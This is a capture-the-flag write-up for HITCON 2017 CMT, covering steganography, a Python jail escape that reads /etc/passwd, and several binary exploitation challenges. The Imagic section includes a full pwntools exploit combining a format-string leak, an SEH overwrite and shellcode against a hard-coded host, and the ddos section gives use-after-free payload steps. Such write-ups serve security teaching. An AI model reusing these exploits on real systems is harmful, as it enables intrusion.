# HITCON 2017 CMT Writeup

## MISC
### Hello world
`HITCON{Hack the planet !}`
### Stegofun4u

- decode.py

```
#!/usr/bin/python
from PIL import Image
data = ""
im = Image.open("./en.png")
pix = im.load()
width, height = im.size
encode_image = Image.new("RGB",(width,height))
newpix = encode_image.load()
x,y = (0,0)

count = 0
for i in range(x,width,1):
        for j in range(y,height,1):
                data += str((pix[i,j][0] & 0x2) >> 1) + str(pix[i,j][1] & 0x1) + str((pix[i,j][2] & 0x4) >> 2)

data_raw =  ''.join(chr(int(data[i*8:i*8+8],2)) for i in range(len(data)//8))
f = open("solve.jpg","w")
f.write(data_raw)
```
Then you will get the picture.
![](solve.jpg)

The picture is a little corruption, you need to fixed it.
That is, the end of jpg is 0xffd9.

After fixed it, use outguess and the key `sh3llw3pl4yth3g4m4` to extract the flag.

### Pyjail
Use the warnings message
`sys.modules['_warnings'].warn_explicit("default",UserWarning,"/etc/passwd",1)`

## Pwnable

### Power Station
It's a little captcha challenge and it has a integer overflow vulnerability in time out function

```
void sig_alarm_handler(int signum){
    unsigned int choice ;
    puts("Power failure");
    printf("Do you want to continue ? (1:yes 2:no)");
    choice = read_int();
    if(choice == 1){
        puts("You lost a little power");
        power -= 50;
        return;
    }else{
        exit(1);
    }
}
```
- You can let the power less than 50 and wait until time out, you would get a very large power.

- You can let power equal to 2000 and buy Nuclear reactor and Solar cell panel than your power will less than 50.


### Imagic
- Vulnerability 
	- Out of bound and buffer overflow in save image.
	- Format string

- Protection
	- Stack cookie 
	- No DEP
	- NO SEHOP,SafeSEH

- Exploit
	- First connection 
		- Use format string vulnerability to leak code base 
	- Second connection 
		- Overwrite the SEH Handler
		- Trigger the SEH and jmp to shellcode
			- You can use `%s` to dereference invailed memory area then it would trigger exception.

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "54.199.221.215"
port = 50216
r = remote(host,port)
r.recvuntil(":")
r.sendline("#%p#")
r.recvuntil(":")
r.sendline("3")
r.recvuntil("#")
codeaddr = int(r.recvuntil("#")[:-1],16)
r.close()
r = remote(host,port)
codebase = codeaddr-0x19610
sc = asm("pop eax;pop eax;pop eax;sub eax,0x40;jmp eax",arch="i386")
name = "%s%s%s%s" + sc
nameaddr = codebase + 0x1c2ac
ret = codebase + 0x1281
system = codebase + 0x1260
scaddr = codebase+0x1c2b4
cmd = codebase + 0x14ab4
main = codebase+0x10e0
r.recvuntil(":")
r.send(name)


def save(size,data):
    r.recvuntil(":")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(data)

save(255,"a"*254)
save(255,"b"*254)
save(255,"c"*254)
save(255,"d"*254)
sc = asm("push 0x%x;mov eax,0x%x;jmp eax" % (cmd,system),arch="i386")
payload = "\x90"*0x30 + sc
save(255,payload.ljust(0x60,"\x90") + p32(scaddr))
r.recvuntil(":")
r.sendline("3")
r.interactive()
```

### ddos
- Vulnerability
	- Use After free in the run function
		- It doesn't check the inused flag when it run.

- Exploit
	- How to use the UAF vulnerability ?
		- [heap exploitation](https://www.slideshare.net/AngelBoy1/heap-exploitation-51891400) p39-44
		- Put the command in the username buffer.
		- Add a target
			- It will allocate a struct and a buffer of RHOST. 
		- Remove the target
			- Release the struct and the buffer of RHOST, but it does not set pointer of the struct to NULL. 
		- Add a target
			-  Use the old struct and allocate a buffer, it wound get same address as the old struct.
			-  You can use it to overwrite the function pointer and name pointer in the structure.
			-  You need to let the name pointer point to `usename buffer` and let the function pointer point to `system`
		- Run
			- trigger the function call 

	- payload
		- Add a target
			- "a"*0x18
		- Remove the target
		- Add a target
			- `*^Gp^Ta\n`
		- Run
